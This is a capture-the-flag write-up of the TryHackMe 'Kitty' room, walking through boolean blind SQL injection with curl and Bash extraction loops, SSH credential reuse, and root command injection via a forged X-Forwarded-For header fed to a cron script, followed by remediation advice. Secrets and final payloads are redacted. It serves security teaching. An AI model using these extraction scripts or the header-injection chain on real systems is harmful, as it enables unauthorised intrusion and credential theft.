# Kitty Challenge

![Banner](./../IMAGES/kitty_img.png?raw=true)

**Category:** *Standalone Challenge* | **Section:** *TryHackMe Challenges* | **Challenge:** *[Kitty](https://tryhackme.com/room/kitty)*

> [!IMPORTANT]
>
> **Working write-up notice:** This was a working and verified write-up at the time of writing on **27 July 2026**.
>
> **Spoiler warning:** This write-up documents the full exploitation chain. Credentials, exact challenge-specific exploit values and flag codes have been intentionally redacted.
>
> **Please note:** The IP addresses used during the lab were dynamically allocated by TryHackMe. The attack was performed from my own Kali Linux VM using OpenVPN to connect to the TryHackMe VPN.
>
> The following placeholders are used throughout:
>
> - `<TARGET_IP>` represents the IP address allocated to the target machine.
> - `<TUN0_IP>` represents the IP address assigned to the Kali Linux `tun0` interface.
> - `<REDACTED>` represents credentials, passwords, exact extracted values, sensitive file contents, command-injection payloads or other challenge giveaways.
> - `THM{....}` represents a redacted TryHackMe flag.
>
> **Licence:** Unless otherwise stated, all write-ups and documentation in this repository are licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). Any original scripts or code snippets are provided under the [MIT Licence](https://opensource.org/license/mit/).

## About TryHackMe

This write-up was made possible by the hard work of the TryHackMe team and the wider cyber security community, who continue to create practical and engaging learning environments for aspiring security professionals.

[TryHackMe](https://tryhackme.com/) is an online cyber security training platform that provides hands-on labs covering penetration testing, networking, web application security, privilege escalation and defensive security.

Its rooms allow learners to develop practical technical skills within controlled and authorised environments.

## Lab Summary

Kitty is a Linux-based web application challenge focused on SQL injection, credential recovery, authenticated remote access and command injection through an unsafe privileged log-processing workflow.

The room begins with a public PHP login and registration application. The successful attack chain involved:

1. Confirming VPN connectivity, routing and local hostname resolution.
2. Enumerating the target's exposed SSH and HTTP services.
3. Discovering the PHP login, registration and authenticated welcome pages.
4. Registering a normal account to establish a known-valid username.
5. Confirming boolean-based SQL injection in the login form.
6. Using response differences to enumerate a target application account.
7. Determining the stored password length.
8. Extracting the password one character at a time with case-sensitive comparisons.
9. Reusing the recovered credentials over SSH.
10. Reading the user flag from the compromised user's home directory.
11. Enumerating local services and identifying a development web application on `127.0.0.1:8080`.
12. Reviewing a root-owned log-processing script and the development application's PHP source.
13. Identifying unsafe trust in the `X-Forwarded-For` header.
14. Injecting shell command substitution into a log entry.
15. Waiting for the privileged scheduled task to process the entry.
16. Confirming root-level command execution.
17. Copying the root flag to a readable temporary location and completing the room.

Confirmed lab details used during the walkthrough:

```text
Target IP: <TARGET_IP>
Kali tun0 IP: <TUN0_IP>
Attacker working directory: /tmp/VK/
Local hostname: kitty.thm
```

The target was added to the Kali VM's local hosts file:

```bash
echo "<TARGET_IP> kitty.thm" | sudo tee -a /etc/hosts
```

The mapping was confirmed with:

```bash
getent hosts kitty.thm
```

VPN routing and the tunnel address were also verified:

```bash
ip route get <TARGET_IP>
ip -br address show tun0
```

The expected routing result showed traffic leaving through `tun0` and using `<TUN0_IP>` as the source address:

```text
<TARGET_IP> via <REDACTED> dev tun0 src <TUN0_IP>
```

Connectivity was confirmed with:

```bash
ping -c 6 kitty.thm
```

> [!TIP]
>
> When using your own Kali Linux VM, the `/etc/hosts` file is especially important in TryHackMe challenges. Many rooms rely on hostname-based routing, virtual hosts, redirects, cookies or application logic that may not behave correctly when the expected hostname is missing.
>
> Over time, `/etc/hosts` can become clogged with mappings from previous rooms. It is advantageous to keep the file clear, tidy and focused on the challenge currently being worked on.
>
> A neglected hosts file eventually becomes DNS spaghetti - technically functional, but increasingly difficult to trust.

The file can be reviewed with:

```bash
cat /etc/hosts
```

An old Kitty entry can be removed with:

```bash
sudo sed -i '/kitty\.thm/d' /etc/hosts
```

The current mapping can then be added again using the newly allocated `<TARGET_IP>`.

## Tools Used

The principal tools and utilities used during the challenge were:

- `ip` for checking VPN routing and the `tun0` address.
- `getent` for validating local hostname resolution.
- `ping` for confirming target connectivity.
- Nmap for TCP port and service enumeration.
- WhatWeb for identifying web technologies.
- Dirsearch, Gobuster, Feroxbuster and FFUF for web content discovery.
- cURL for making controlled HTTP requests, registering users, authenticating and testing injection conditions.
- Bash loops for boolean-based blind SQL injection and character-by-character extraction.
- OpenSSH for establishing a stable remote shell.
- `ss` for identifying locally bound services.
- `ls`, `cat`, `sed` and other standard Linux utilities for local enumeration and source-code review.

Click [HERE](https://github.com/Valikahn/TryHackMe-Standalone-Challenge#tools-commonly-used) to return to the repository README. The `Tools Commonly Used` section contains links to tools used throughout the pathway.

## Initial Enumeration

### Port and Service Discovery

A full TCP scan was performed against the target:

```bash
nmap -Pn -p- --min-rate 2000 -T4 \
  -oN /tmp/VK/kitty-all-ports.nmap \
  kitty.thm
```

The principal exposed services were:

```text
22/tcp open  ssh
80/tcp open  http
```

This immediately suggested two likely routes:

- A public web application on TCP port 80.
- SSH access that might become useful if valid credentials could be recovered.

### Web Technology Identification

WhatWeb identified the main technologies in use:

```bash
whatweb -a 1 kitty.thm/
```

Relevant findings included:

```text
Apache 2.4.41
Ubuntu Linux
PHP session cookie
Bootstrap 4.5.2
Login page
```

The application set a `PHPSESSID` cookie and presented a standard username and password form.

### Web Content Discovery

Dirsearch was used first:

```bash
dirsearch -u kitty.thm/
```

Relevant results included:

```text
/config.php
/index.php
/logout.php
/register.php
```

Additional discovery with FFUF identified:

```text
/welcome.php
```

Gobuster and Feroxbuster confirmed the small application footprint and did not reveal a larger hidden directory structure.

The exposed application therefore consisted primarily of:

```text
index.php
register.php
welcome.php
logout.php
config.php
```

### Manual HTTP Inspection

The login page was inspected with cURL:

```bash
curl -s -i http://kitty.thm/
```

The returned HTML showed a POST form containing:

```html
<input type="text" name="username">
<input type="password" name="password">
```

The registration page was also reviewed:

```bash
curl -s -i http://kitty.thm/register.php
```

It accepted:

```text
username
password
confirm_password
```

The configuration file returned an empty-looking response:

```bash
curl -s -i http://kitty.thm/config.php
```

This indicated that the file was likely executed by PHP rather than exposed as downloadable source.

## Exploits

### Registering a Known User

A normal account was created before testing the login logic:

```bash
curl -s -i -X POST http://kitty.thm/register.php \
  -d 'username=<REDACTED>&password=<REDACTED>&confirm_password=<REDACTED>'
```

The server returned:

```text
HTTP/1.1 302 Found
location: index.php
```

This confirmed successful registration.

Using a known-valid account was important because it provided a stable username around which boolean SQL conditions could be tested.

### Confirming Normal Authentication

The newly created account was used to establish a normal authenticated session:

```bash
curl -s -i \
  -c /tmp/VK/kitty.cookies \
  -X POST http://kitty.thm/index.php \
  -d 'username=<REDACTED>&password=<REDACTED>'
```

The result was:

```text
HTTP/1.1 302 Found
location: welcome.php
```

The authenticated page was then requested using the saved cookie:

```bash
curl -s \
  -b /tmp/VK/kitty.cookies \
  http://kitty.thm/welcome.php
```

The page displayed a generic development message and did not expose any sensitive information.

### Boolean-Based SQL Injection

A true boolean condition was supplied in the username field:

```bash
curl -s -i -X POST http://kitty.thm/index.php \
  --data-urlencode "username=<REDACTED>' and 1=1-- -" \
  --data-urlencode "password=<REDACTED>"
```

The application returned:

```text
HTTP/1.1 302 Found
location: welcome.php
```

A false condition was then tested:

```bash
curl -s -i -X POST http://kitty.thm/index.php \
  --data-urlencode "username=<REDACTED>' and 1=2-- -" \
  --data-urlencode "password=<REDACTED>"
```

This time, the application returned:

```text
HTTP/1.1 200 OK
Invalid username or password
```

The response difference created a reliable boolean oracle:

| Condition | Response | Meaning |
|---|---|---|
| True | `302 Found` and redirect to `welcome.php` | Injected predicate evaluated as true |
| False | `200 OK` and invalid-credentials message | Injected predicate evaluated as false |

### Confirming the Target Account

The known username was used as the base of a nested query that checked whether the application database contained the target account:

```bash
curl -s -o /dev/null \
  -w 'HTTP %{http_code} | Redirect: %{redirect_url}\n' \
  -X POST http://kitty.thm/index.php \
  --data-urlencode "username=<REDACTED>' and (select count(*) from siteusers where username='<REDACTED>')=1-- -" \
  --data-urlencode "password=<REDACTED>"
```

The server returned:

```text
HTTP 302 | Redirect: http://kitty.thm/welcome.php
```

This confirmed both:

- The table name `siteusers`.
- The existence of the target application account.

The account name is intentionally redacted because it is challenge-specific.

### Determining the Password Length

An initial check for a 32-character value returned a false condition, showing that the password was not stored as a typical 32-character MD5 string.

A loop was then used to test possible lengths:

```bash
for length in $(seq 1 100); do
  code=$(curl -s -o /dev/null -w '%{http_code}' \
    -X POST http://kitty.thm/index.php \
    --data-urlencode "username=<REDACTED>' and (select length(password) from siteusers where username='<REDACTED>')=${length}-- -" \
    --data-urlencode "password=<REDACTED>")

  [ "$code" = "302" ] && \
    echo "Password length: $length" && \
    break
done
```

The database returned a true condition at:

```text
Password length: <REDACTED>
```

The exact length is omitted because it narrows the challenge answer significantly.

### Extracting the Password Character by Character

The password was extracted through case-sensitive boolean comparisons.

A candidate character set was defined, and each password position was tested in sequence:

```bash
charset='<REDACTED>'
password=''

for position in $(seq 1 <REDACTED>); do
  for ((i=0; i<${#charset}; i++)); do
    character="${charset:$i:1}"

    code=$(curl -s -o /dev/null -w '%{http_code}' \
      -X POST http://kitty.thm/index.php \
      --data-urlencode "username=<REDACTED>' and binary substring((select password from siteusers where username='<REDACTED>'),${position},1)='${character}'-- -" \
      --data-urlencode "password=<REDACTED>")

    if [ "$code" = "302" ]; then
      password+="$character"
      echo "Position $position: <REDACTED>"
      break
    fi
  done
done

echo "Recovered password: <REDACTED>"
```

The `binary` keyword forced a case-sensitive comparison. This mattered because the recovered value contained a mixture of uppercase letters, lowercase letters, digits and punctuation.

No separate encoding or cryptographic decoding stage was required. The password was recovered directly from the database through blind boolean inference.

The recovered credential is intentionally redacted:

```text
Username: <REDACTED>
Password: <REDACTED>
```

### SSH Foothold

The recovered credentials were tested against SSH:

```bash
ssh <REDACTED>@kitty.thm
```

The credentials were valid, and an interactive shell was obtained:

```text
<REDACTED>@<REDACTED>:~$
```

### User Flag

The first objective was read from the compromised user's home directory:

```bash
cat ~/user.txt
```

The result is intentionally redacted:

```text
THM{....}
```

This completed the first question before any privilege-escalation activity began.

### Local Privilege-Escalation Enumeration

The compromised user had no permitted `sudo` commands:

```bash
sudo -l
```

The response confirmed:

```text
Sorry, user <REDACTED> may not run sudo on <REDACTED>.
```

The `/opt` directory contained a custom script:

```bash
ls -la /opt
```

Relevant result:

```text
/opt/log_checker.sh
```

The script was reviewed:

```bash
cat /opt/log_checker.sh
```

Its important behaviour was:

```sh
#!/bin/sh
while read ip;
do
  /usr/bin/sh -c "echo $ip >> /root/logged";
done < /var/www/development/logged
cat /dev/null > /var/www/development/logged
```

This was immediately suspicious because untrusted text from a log file was inserted inside a command string executed by `/usr/bin/sh -c`.

The input file was owned by the web service account:

```bash
ls -l /var/www/development/logged
```

The directory itself was root-owned and not writable by the compromised user:

```bash
ls -ld /var/www/development
```

This meant direct file modification was not available. Another process had to be responsible for writing attacker-controlled content into the file.

### Discovering the Internal Development Application

Listening services were enumerated:

```bash
ss -lntp
```

A local-only HTTP service was discovered:

```text
127.0.0.1:8080
```

The service was requested from the SSH session:

```bash
curl -i http://127.0.0.1:8080/
```

The page title identified it as the development version of the same login application.

### Reviewing the Development Source Code

The PHP source was readable locally:

```bash
sed -n '1,220p' /var/www/development/index.php
```

The source contained a blacklist of SQL injection patterns:

```php
$evilwords = [
    "/sleep/i",
    "/0x/i",
    "/\*\*/",
    "/-- [a-z0-9]{4}/i",
    "/ifnull/i",
    "/ or /i"
];
```

When a blocked pattern was detected, the application performed the following actions:

```php
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
$ip .= "\n";
file_put_contents("/var/www/development/logged", $ip);
```

This created the privilege-escalation chain:

1. The client controlled the `X-Forwarded-For` header.
2. The application trusted the header without validation.
3. A blocked SQL injection pattern caused the header to be written to `/var/www/development/logged`.
4. `/opt/log_checker.sh` later read the line.
5. The line was interpolated into a root shell command.
6. Shell metacharacters inside the logged value could therefore be evaluated as root.

### Safe Proof of Root Command Execution

A harmless test payload was sent through the `X-Forwarded-For` header:

```bash
curl -s -X POST http://127.0.0.1:8080/index.php \
  -H 'X-Forwarded-For: <REDACTED>' \
  --data-urlencode 'username=<REDACTED> or <REDACTED>' \
  --data-urlencode 'password=<REDACTED>'
```

The immediate response was:

```text
SQL Injection detected. This incident will be logged!
```

After the scheduled task processed the log, the test file appeared:

```bash
ls -l /tmp/<REDACTED>
```

Its ownership proved that the command had executed with root privileges:

```text
-rw-r--r-- 1 root root 0 <REDACTED> /tmp/<REDACTED>
```

### Root Flag

The same primitive was used to copy the root flag into a temporary file and make the copy readable:

```bash
curl -s -X POST http://127.0.0.1:8080/index.php \
  -H 'X-Forwarded-For: <REDACTED>' \
  --data-urlencode 'username=<REDACTED> or <REDACTED>' \
  --data-urlencode 'password=<REDACTED>'
```

The exact command-substitution payload is intentionally omitted because it directly gives away the final exploitation step.

The privileged task did not execute instantly. Approximately 30 seconds passed before the copied file appeared, indicating that the script was being run periodically by a cron job or timer.

The file was then checked and read:

```bash
ls -l /tmp/<REDACTED>
cat /tmp/<REDACTED>
```

The root-owned copy contained the final flag:

```text
THM{....}
```

This completed the second question and the room.

## Full Attack Chain Recap

### 1. VPN and Hostname Preparation
The target and `tun0` addresses were confirmed. `kitty.thm` was mapped to `<TARGET_IP>` in `/etc/hosts`, and the route was verified through the TryHackMe VPN.

### 2. External Service Discovery
Nmap identified SSH on port 22 and an Apache/PHP web application on port 80.

### 3. Web Enumeration
WhatWeb identified Apache, PHP sessions and Bootstrap. Directory discovery revealed the login, registration, welcome, logout and configuration endpoints.

### 4. Controlled Account Registration
A normal account was registered so that a known-valid username could be used while testing the login query.

### 5. Boolean SQL Injection
A true injected condition produced a `302` redirect, while a false condition produced a `200` response and an invalid-credentials message. This established a reliable boolean oracle.

### 6. Database Account Confirmation
A nested query confirmed that the `siteusers` table contained the target account.

### 7. Password-Length Enumeration
Possible password lengths were tested one at a time until the application returned the true response.

### 8. Case-Sensitive Character Extraction
Each character was inferred using `binary substring(...)` comparisons. The recovered plaintext credential is redacted from this public write-up.

### 9. SSH Access
The recovered application credentials were reused successfully over SSH, producing an interactive shell as a local Linux user.

### 10. User Flag
The first flag was read from the user's home directory:

```text
THM{....}
```

### 11. Privilege-Escalation Enumeration
`sudo -l` provided no direct route. A custom root-owned script under `/opt` processed `/var/www/development/logged` through `/usr/bin/sh -c`.

### 12. Internal Service Discovery
`ss -lntp` revealed a development web application bound to `127.0.0.1:8080`.

### 13. Source-Code Review
The development PHP source showed that blocked SQL injection attempts caused the client-supplied `X-Forwarded-For` header to be written directly to the log file.

### 14. Command-Injection Chain
The root-owned script later embedded each log line inside a shell command. Shell command substitution in the forged header was therefore evaluated by a privileged shell.

### 15. Root Execution Confirmation
A harmless test file appeared under `/tmp` with `root:root` ownership, proving successful root command execution.

### 16. Scheduled Execution Delay
The exploitation was not immediate. The scheduled process required roughly 30 seconds to handle the malicious log entry.

### 17. Root Flag
The root flag was copied to a readable temporary file and recovered:

```text
THM{....}
```

## Key Lessons

Kitty demonstrated several important penetration-testing and defensive-security lessons:

- Confirm VPN routing and hostname resolution before troubleshooting application behaviour.
- Keep `/etc/hosts` tidy when working through multiple TryHackMe rooms from a personal VM.
- Registering a controlled account can provide a reliable baseline for authentication testing.
- HTTP status codes and redirects can form a powerful boolean side channel.
- Blacklist-based SQL injection filtering is fragile and should not be treated as a security boundary.
- Blind SQL injection does not require visible database errors or returned query output.
- Case sensitivity matters when extracting secrets character by character.
- Application credentials should not be assumed to be isolated from operating-system accounts.
- Credential reuse can convert a web vulnerability into remote shell access.
- Local-only services deserve careful enumeration after obtaining a foothold.
- Readable application source code can expose the exact trust boundary needed for privilege escalation.
- `X-Forwarded-For` is attacker-controlled unless it is overwritten and validated by a trusted reverse proxy.
- Logging suspicious input is not automatically safe; the logging pipeline must also treat all data as untrusted.
- Passing log data into `sh -c` creates an avoidable command-injection risk.
- Privileged scheduled tasks may introduce a delay between payload delivery and observable execution.
- A harmless proof file is a good way to confirm command execution before attempting the final objective.
- Public write-ups should explain the method without publishing live credentials, exact flags or unnecessary challenge giveaways.

The central lesson was that two individually weak design choices became critical when combined. The development application trusted a client-controlled proxy header, while the root-owned script trusted the resulting log line as shell-safe text. The application and the scheduled task each assumed that the other had already validated the data. Neither had.

## Remediation Notes

### SQL Injection Prevention

- Replace string-built SQL queries with prepared statements and parameterised queries.
- Apply server-side input validation as a secondary control, not as a substitute for safe query construction.
- Remove blacklist-based SQL injection detection as the primary security mechanism.
- Use least-privileged database accounts for web applications.
- Return consistent authentication responses to reduce boolean side channels.
- Add rate limiting and monitoring for repeated authentication probes.
- Store passwords using a modern password-hashing function such as Argon2id, bcrypt or scrypt.
- Never store recoverable plaintext passwords.

### Authentication and Credential Management

- Do not reuse web application passwords for Linux or SSH accounts.
- Prefer key-based SSH authentication over passwords.
- Restrict SSH access to trusted networks or VPN ranges.
- Apply multi-factor authentication where practical.
- Rotate credentials immediately after suspected disclosure.
- Enforce unique passwords across application, administrative and operating-system accounts.
- Use a central secrets-management process rather than embedding or reusing credentials.

### Proxy Header Security

- Do not trust `X-Forwarded-For` directly from arbitrary clients.
- Configure the web server or framework to accept proxy headers only from explicitly trusted reverse proxies.
- Overwrite untrusted forwarding headers at the network edge.
- Validate logged IP addresses with a strict IP-address parser.
- Store structured request metadata rather than raw header text.
- Record the socket peer address separately from proxy-supplied values.
- Reject malformed or multi-line forwarding headers.

### Secure Logging

- Treat every value entering a log file as untrusted data.
- Avoid passing log contents to a shell.
- Use structured logging formats such as JSON with safe serialisation.
- Escape control characters and remove unexpected newlines.
- Apply restrictive ownership and permissions to security logs.
- Monitor unexpected shell metacharacters in fields that should contain IP addresses.
- Keep detection logs separate from files consumed by privileged automation.
- Ensure log-processing failures cannot lead to arbitrary command execution.

### Scheduled Task and Shell Safety

- Remove `/usr/bin/sh -c` from the log-processing workflow.
- Process the file using a purpose-built script that performs no shell interpolation.
- Quote every variable expansion even when the expected input appears simple.
- Validate each line as an IPv4 or IPv6 address before use.
- Run the processor under a dedicated low-privilege service account.
- Avoid writing output into `/root` unless strictly necessary.
- Use systemd hardening options where appropriate.
- Audit cron jobs, timers and custom scripts regularly.
- Alert on privileged processes reading files writable by web service accounts.
- Do not allow user-controlled text to cross directly from a web request into a root command.

### Development Environment Security

- Do not expose development application source code to ordinary users.
- Separate development and production applications using different accounts and permissions.
- Do not leave development services running on production systems without a documented requirement.
- Require authentication for internal development interfaces.
- Bind local services only when necessary and apply host-level firewall rules.
- Remove diagnostic code and temporary detection logic before deployment.
- Review development copies for controls that differ from production.
- Avoid treating loopback exposure as equivalent to strong access control.

### Operational Hygiene

- Keep `/etc/hosts` limited to active lab mappings.
- Remove stale challenge entries after completing each room.
- Maintain a separate working directory for each engagement.
- Preserve scan output and relevant evidence in clearly named files.
- Record target, hostname and `tun0` details at the beginning of the lab.
- Validate each stage of the attack chain before moving to the next.
- Allow for cron or timer delays when testing scheduled execution.
- Clean up temporary proof files after the authorised lab is complete.

## In Memory of Kitty
> "This room is dedicated to the room creator's brother's cat, whose name was Kitty.
>
> Sadly, she passed away on 4 October 2022. She was part of our family for 13 years, and we miss her very much."
>
> ![Kitty1](./../IMAGES/kitty1_img.jpg?raw=true) ![Kitty2](./../IMAGES/kitty2_img.jpg?raw=true)

## Disclaimer

This writeup is intended solely for education, training and documentation of an authorised TryHackMe lab.

All tools, commands, payloads and post-exploitation techniques described here were used within a controlled environment provided by TryHackMe. Permission to interact with the target was granted by the platform owner and operator as part of the room.

The tools and methods documented in this walkthrough represent one successful approach. They are not the only possible techniques, and alternative tools or workflows may produce the same result.

Never test, scan, exploit or access a system without clear and explicit authorisation from its owner.

---
[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoffee.com/v4l1k4hn)  

**Powered on ☕ made with ❤️ by [V4L1K4HN](https://tryhackme.com/p/V4L1K4HN)**  
⭐ If this project is useful, consider starring it on GitHub.
